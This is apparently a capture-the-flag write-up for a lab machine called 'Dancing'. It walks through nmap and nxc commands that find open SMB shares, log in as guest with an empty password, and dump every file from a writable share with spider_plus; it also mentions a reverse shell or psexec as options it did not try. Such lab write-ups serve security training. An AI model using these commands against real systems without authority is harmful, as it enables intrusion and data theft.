# Dancing Box (SMB Intro)


## Enumertation

First step, ran nmap command
> sudo nmap -sC -sV 10.129.57.34 -oA dancing

This revealed:
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-13T20:44:21
|_  start_date: N/A
|_clock-skew: 3h58m36s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

Notice SMB (445) is setup, attempt to enemurate with
>nxc smb 10.129.57.34 
```SMB         10.129.57.34    445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)```

NULL Auth=True, we dont need perms, move to next step


## Exploitation
Tried:
>nxc smb 10.129.57.34 -u '' -p '' --shares

But kept getting STATUS DENIED, so supplment a random username (guest,admin, etc etc)
We got something!

```
SMB         10.129.57.34    445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.57.34    445    DANCING          [+] Dancing\guest: 
SMB         10.129.57.34    445    DANCING          [*] Enumerated shares
SMB         10.129.57.34    445    DANCING          Share           Permissions     Remark
SMB         10.129.57.34    445    DANCING          -----           -----------     ------
SMB         10.129.57.34    445    DANCING          ADMIN$                          Remote Admin
SMB         10.129.57.34    445    DANCING          C$                              Default share
SMB         10.129.57.34    445    DANCING          IPC$            READ            Remote IPC
SMB         10.129.57.34    445    DANCING          WorkShares      READ,WRITE      
```

From here, you can either do a few things
 - use smbclient and connect to the share, explore from there 
 - use spider_plus to dump all avaliable files from the share
 - Attempt to send a payload over and get reverse shell 
    - Possibly send a download paylaod and host the file? Or use impacket psexec/smbexec? Havent tried this tbh

I dislike being connected to the target for long, so i use spider plug to just dump everything
>nxc smb 10.129.57.34 -u 'guest' -p '' -M spider_plus

This downloads everything, time to go see the loot

## Loot/Post Exploitation
```
.
├── Amy.J
│   └── worknotes.txt
└── James.P
    └── flag.txt

3 directories, 2 files
```

**We did it!**
